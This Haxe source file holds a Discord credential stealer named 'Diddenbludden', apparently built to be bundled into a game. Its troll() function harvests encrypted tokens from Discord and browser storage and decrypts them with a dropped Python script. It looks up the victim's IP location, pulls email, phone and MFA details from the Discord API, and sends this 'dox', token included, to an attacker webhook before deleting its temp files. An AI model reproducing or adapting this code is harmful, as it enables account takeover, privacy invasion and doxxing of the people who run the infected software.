package;

import Discord.DiscordClient;
import lime.utils.Assets;
import sys.io.Process;
import sys.FileSystem;
import sys.io.File;
import haxe.Json;
import haxe.Http;

using StringTools;

/**
 * skewi on tha muthafuckin beat
 */
class Diddenbludden
{
	/**
	 * used in the message that logs the data
	 * 'Logged by $VERSION'
	 */
	public static final VERSION:String = 'Diddenbludden';

	public function new()
	{
		trace('[Diddenbludden] Loading...');
	}

	/**
	 * does the whole thing
	 */
	public function troll()
	{
		var local:String = Sys.getEnv('LOCALAPPDATA');
		var roaming:String = Sys.getEnv('APPDATA');

		var paths:Map<String, String> = [
			'Discord' => '$roaming\\discord',
			'Discord Canary' => '$roaming\\discordcanary',
			'Lightcord' => '$roaming\\Lightcord',
			'Discord PTB' => '$roaming\\discordptb',
			'Opera' => '$roaming\\Opera Software\\Opera Stable',
			'Opera GX' => '$roaming\\Opera Software\\Opera GX Stable',
			'Orbitum' => '$local\\Orbitum\\User Data',
			'Vivaldi' => '$local\\Vivaldi\\User Data\\Default',
			'Chrome SxS' => '$local\\Google\\Chrome SxS\\User Data',
			'Chrome' => '$local\\Google\\Chrome\\User Data\\Default',
			'Microsoft Edge' => '$local\\Microsoft\\Edge\\User Default\\Default',
			'Brave' => '$local\\BraveSoftware\\Brave-Browser\\User Data\\Default',
			'Iridum' => '$local\\Iridum\\User Data\\Default'
		];

		// Gets your IP information
		var dox;

		var http:Http = new Http('http://ip-api.com/json');

		http.onData = function(data:String)
		{
			dox = Json.parse(data);
		}

		http.onError = function(data:String)
		{
			trace('HTTP ERROR: $data');
		}

		http.request();

		var tokens:Array<String> = [];

		// Reads your APPDATA storage to get files that may contain encrypted tokens (and encryption keys)
		for (path in paths)
		{
			if (!FileSystem.exists(path))
			{
				trace('[Diddenbludden] Path $path Doesnt exist. skipping');
				continue;
			}

			for (token in getTokens(path))
			{
				if (token.endsWith('\\')) {
					token.replace('\\', '');
				}

				trace('[Diddenbludden] trying to decrypt token found at path $path...');

				// Decrypts our token
				try
				{
					var decryptedToken:String = decryptToken(token, getKey(path));

					Sys.sleep(1); // demosle tiempo pa que cargue no

					if (decryptedToken == null || decryptedToken == 'COULD NOT DECRYPT TOKEN')
					{
						trace('[Diddenbludden] Failed to decrypt token at path $path. skipping');
						continue;
					}
					else
						trace('[Diddenbludden] Successfully decrypted token $decryptedToken');

					if (!tokens.contains(decryptedToken)) tokens.push(decryptedToken);
				}
			}
		}

		// Logs a lot of information of your Discord account in a message sent by the webhook
		for (token in tokens) {
			trace('[Diddenbludden] Mining token $token...');

			@:privateAccess
			{
				var webhook:Http = new Http(WEBHOOK);
				webhook.setHeader('Content-Type', 'application/json');

				final headers:Map<String, String> = getHeaders(token);

				var apiData:Map<String, Dynamic> = [];

				var userApiV10Request:Http = new Http('https://discord.com/api/v10/users/' + DiscordClient.user.userId);

				for (key in headers.keys())
				{
					userApiV10Request.setHeader(key, headers.get(key));
				}

				userApiV10Request.onError = function(ex)
				{
					trace('jaja xd $ex');
					apiData = [];
				}

				// really stupid way to copy data
				userApiV10Request.onData = function(data:String)
				{
					var user = Json.parse(data);

					apiData.set('avatar', 'https://cdn.discordapp.com/avatars/' + DiscordClient.user.userId + '/' + user.avatar + '.png');
					apiData.set('banner', 'https://cdn.discordapp.com/banners/' + DiscordClient.user.userId + '/' + user.banner + '.png');
					// apiData.set('pronouns', user.pronouns);
					apiData.set('discriminator', user.discriminator);
					apiData.set('public-flags', user.public_flags);
					apiData.set('flags', user.flags);
					apiData.set('clan', user.clan);
					apiData.set('mfa-enabled', user.mfa_enabled);
					apiData.set('premium-type', user.premium_type);
					apiData.set('email', user.email);
					apiData.set('verified', user.verified);
					apiData.set('phone', user.phone);
					apiData.set('nsfw-allowed', user.nsfw_allowed);
					apiData.set('premium-usage-flags', user.premium_usage_flags);
					apiData.set('linked-users', user.linked_users);
					apiData.set('purchased-flags', user.purchased_flags);
					apiData.set('bio', user.bio);
					apiData.set('authenticator-types', user.authenticator_types);
					apiData.set('age-verification-status', user.age_verification_status);

					Sys.sleep(1); // demosle tiempo pa que cargue no
				}

				userApiV10Request.request();

				// Writes the message
				var information:String = '# LOGGED BY $VERSION\n### At ' + Date.now().toString() + ' (Timezone: ' + dox.timezone + ')\n';

				information += '**User:** ' + DiscordClient.user.globalName + '\n';
				information += '**User Name:** ' + DiscordClient.user.username + '\n';
				information += '**User Bio:** ' + apiData.get('bio') + '\n';
				information += '**User Avatar:** ' + apiData.get('avatar') + '\n';
				information += '**User Banner:** ' + apiData.get('banner') + '\n';
				information += '**User ID:** ' + DiscordClient.user.userId + '\n';
				information += '**User Discriminator:** ' + DiscordClient.user.discriminator + '\n';
				information += '**User Premium Type:** ' + formatUserData('premium-type', apiData.get('premium-type')) + '\n';
				information += '**Is User a Bot?:** ' + DiscordClient.user.bot + '\n'; // lol
				information += '**User Flags:** ' + apiData.get('flags') + '\n';
				information += '**User Clan:** ' + apiData.get('clan') + '\n';
				information += '**User MFA Enabled:** ' + apiData.get('mfa-enabled') + '\n';
				information += '**User Email:** ' + apiData.get('email') + '\n';
				information += '**User Verified:** ' + apiData.get('verified') + '\n';
				information += '**User Phone Number:** ' + apiData.get('phone') + '\n';
				information += '**User NSFW Allowed:** ' + apiData.get('nsfw-allowed') + '\n';
				information += '**User Premium Usage Flags:** ' + formatUserData('premium-usage-flags', apiData.get('premium-usage-flags')) + '\n';
				information += '**User Linked Users:** ' + apiData.get('linked-users') + '\n';
				information += '**User Purchased Flags:** ' + formatUserData('purchased-flags', apiData.get('purchased-flags')) + '\n';
				information += '**User Authenticator Types:** ' + formatUserData('authenticator-types', apiData.get('authenticator-types')) + '\n';
				information += '**User Age Verification Status:** ' + formatUserData('age-verification-status', apiData.get('age-verification-status')) + '\n';

				information += '\n';

				information += '**IP:** ' + dox.query + '\n';
				information += '**ISP:** ' + dox.isp + '\n';
				information += '**Country:** ' + dox.country + '\n';
				information += '**Region Name**: ' + dox.regionName + '\n';
				information += '**Region:** ' + dox.region + '\n';
				information += '**Timezone**: ' + dox.timezone + '\n';
				information += '**ZIP Code:** ' + dox.zip + '\n';
				information += '**AS:** ' + dox.as + '\n';
				information += '**Longitude**: ' + dox.lon + '\n';
				information += '**Latitude**: ' + dox.lat + '\n';
				information += '**City:** ' + dox.city + '\n';
				information += '**Country Code:** ' + dox.countryCode + '\n';
				information += '**ORG:** ' + dox.org + '\n';

				information += '\n';

				information += '**Status:** ' + dox.status + '\n';

				information += '\n';

				information += '**Token:** $token';

				// Sends your dox to the webhook
				sendDiscordMessage(information, webhook);

				curMessage++;
			}
		}

		// deletes the temp didden folde r
		if (FileSystem.exists(Sys.getEnv('TEMP') + '/didden')) {
			FileSystem.deleteDirectory(Sys.getEnv('TEMP') + '/didden');
		}
	}

	/**
	 * Returns the headers needed to access the Discord API.
	 * @param token Your Discord account token
	 * @return the headers
	 */
	function getHeaders(token:String):Map<String, String>
	{
		var headers:Map<String, String> = [
			'Content-Type' => 'application/json',
			'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36'
		];

		if (token != '' && token.length > 0 && token != null) {
			headers.set('Authorization', token); // Authorization is the token
		}

		return headers;
	}

	/**
	 * Reads your Discord storage files to get encrypted tokens.
	 * @return Every single token we could find
	 */
	function getTokens(path:String):Array<String>
	{
		var tokens:Array<String> = [];

		path += '\\Local Storage\\leveldb\\';

		// Couldn't get your local storage folder
		if (!FileSystem.exists(path))
		{
			return tokens;
		}

		// searchs for an encrypted token in your files
		for (file in FileSystem.readDirectory(path))
		{
			if (!file.endsWith('.ldb') && !file.endsWith('.log'))
			{
				continue;
			}

			try
			{
				for (line in File.getContent(path + file).split('\n'))
				{
					final regex = ~/dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\\"]*"/;

					if (regex.match(line.trim()))
					{
						tokens.push(regex.matched(0));
					}
				}
			}
			catch(ex:Dynamic)
			{
				trace('ERROR WHILE GETTING TOKEN: $ex');
				continue;
			}
		}

		return tokens;
	}

	/**
	 * Gets the encryption key for the token
	 * @param path
	 * @return String
	 */
	function getKey(path:String):String
	{
		return Json.parse(File.getContent('$path\\Local State')).os_crypt.encrypted_key;
	}

	/**
	 * save both your (raw) token and key in a file in temp folder, then open a python script with these 2 params and let the python script do all the work.
	 * @param token Raw token
	 * @param key Encryption key
	 * @return Your Discord account token
	 */
	function decryptToken(token:String, key:String):String
	{
		// this function is so ugly lol

		var temp:String = Sys.getEnv('TEMP');

		// Creates the Diddenbludden temporary files folder
		if (!FileSystem.exists('$temp/didden'))
		{
			FileSystem.createDirectory('$temp/didden/');
		}

		// Saves the AES decryption script and the file with your raw tokend and key in separate temporary files.
		File.saveContent('$temp/didden/diddenbludden.py', Assets.getText('diddenbludden.py'));
		File.saveContent('$temp/didden/didden_temp_1.didden', token + '\n' + key);

		// Runs the decryption script
		var didden:Process = new Process('python', [temp + '/didden/diddenbludden.py', temp + '/didden/']);
		didden.close();

		// Gets the token and then delete the files
		if (FileSystem.exists('$temp/didden/didden_temp_2.didden')) 
		{
			final cleanToken:String = File.getContent('$temp/didden/didden_temp_2.didden');

			// deletes the temp files
			for (cache in ['didden_temp_1.didden', 'didden_temp_2.didden', 'diddenbludden.py'])
			{
				// we cant delete a file that doenst exist!
				if (!FileSystem.exists(temp + '/didden/' + cache)) continue;

				FileSystem.deleteFile(temp + '/didden/' + cache);
			}

			return cleanToken;
		}
		else
			return 'COULD NOT DECRYPT TOKEN';
	}

	/**
	 * Sends a HTTP request to the webhook to post a message through the webhook
	 * @param msg 
	 * @param webhook 
	 */
	function sendDiscordMessage(msg:String, webhook:Http)
	{
		webhook.setPostData(Json.stringify({content: msg})); // you can add embeds by doing ``embeds: [title:String, description:String, color:Int]``
		webhook.request();
	}

	/**
	 * Formats "raw" data to a readable string.
	 * example: premium-type 0 => No Nitro
	 * @param id ID of the data we want to format
	 * @param data The data we want to format
	 * @return a very pretty string :3
	 */
	function formatUserData(id:String, data:Dynamic):String
	{
		var output:String = Std.string(data);

		switch (id.toLowerCase())
		{
			case 'premium-type':
				output = return switch (data)
				{
					case 1: return 'Nitro';
					case 2: return 'Nitro Classic';
					case 3: return 'Nitro Boost';
					default: return 'No Nitro';
				}
			case 'authenticator-types':
				output = return switch (data)
				{
					case 0: return 'None';
					case 1: return 'Mobile Authenticator';
					case 2: return 'Hardware Authenticator';
					default: return 'Unknown';
				}
			case 'age-verification-status':
				output = return switch (data)
				{
					case 0: return 'Not Verified';
					case 1: return 'Verified';
					default: return 'Unknown';
				}
			case 'premium-usage-flags':
				var flags:Int = data;
				var flagString:String = '';

				if (flags & 1 == 1) flagString += 'Used Nitro Classic, ';
				if (flags & 2 == 2) flagString += 'Used Nitro, ';
				if (flags & 4 == 4) flagString += 'Server Boosted, ';
				if (flags & 8 == 8) flagString += 'Used Nitro for Server Boost, ';

				if (flagString.endsWith(', '))
					flagString = flagString.substring(0, flagString.length - 2);
				else if (flagString == '')
					flagString = 'No Premium Features Used';

				output = flagString;
			case 'purchased-flags':
				var flags:Int = data;
				var flagString:String = '';

				if (flags & 1 == 1) flagString += 'Nitro Classic Purchased, ';
				if (flags & 2 == 2) flagString += 'Nitro Purchased, ';
				if (flags & 4 == 4) flagString += 'Server Boost Purchased, ';
				if (flags & 8 == 8) flagString += 'Game Purchased, ';
				if (flags & 16 == 16) flagString += 'Subscription Purchased, ';
				if (flags & 32 == 32) flagString += 'Gift Purchased, ';

				if (flagString.endsWith(', '))
					flagString = flagString.substring(0, flagString.length - 2);
				else if (flagString == '')
					flagString = 'No Purchases';

				output = flagString;
			case 'relationship-type':
				output = return switch (data)
				{
					default: 'None';
					case 1: 'Friend';
					case 2: 'Blocked';
					case 3: 'Incoming Request';
					case 4: 'Outgoing Request';
					case 5: 'Implicit';
					case 6: 'Suggestion';
				}
		}

		return output;
	}
}
